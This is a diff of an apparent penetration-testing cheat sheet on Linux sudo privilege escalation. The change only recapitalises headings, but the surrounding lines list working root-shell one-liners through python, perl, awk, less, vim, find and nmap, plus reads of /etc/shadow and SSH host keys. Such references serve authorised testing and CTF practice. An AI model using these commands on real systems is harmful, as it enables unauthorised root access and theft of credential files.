@@ -70,31 +70,31 @@ cat /etc/ssh/ssh_host_key
 
 ## Sudoers - Privesc
 
-##### python
+##### Python
 ```
 sudo -u root /usr/bin/python
 >>> from subprocess import call
 >>> call(['/bin/bash'])
 ```
 
-##### perl
+##### Perl
 ```
 sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
 ```
 
-##### cp + chmod
+##### CP + Chmod
 ```
 sudo -u root /bin/cp exploit exploit
 sudo -u root /bin/chmod +xs exploit
 ./exploit
 ```
 
-##### awk
+##### Awk
 ```
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-##### less
+##### Less
 ```
 Solution 1 - read a file
 sudo -u root /usr/bin/less /etc/shadow
@@ -105,14 +105,14 @@ then insert the following command :
 !/bin/bash
 ```
 
-##### vim
+##### Vim
 ```
 sudo -u victim /usr/bin/vim
 puis on tape (pas dans le fichier mais de la même manière que lorsque l'on souhaite quitter vim):
 :!/bin/bash
 ```
 
-##### find
+##### Find
 ```
 sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
 ```
@@ -122,7 +122,7 @@ sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
 sudo -u root /bin/bash
 ```
 
-##### nmap
+##### Nmap
 ```
  sudo -u nmap –interactive
 nmap>!bash
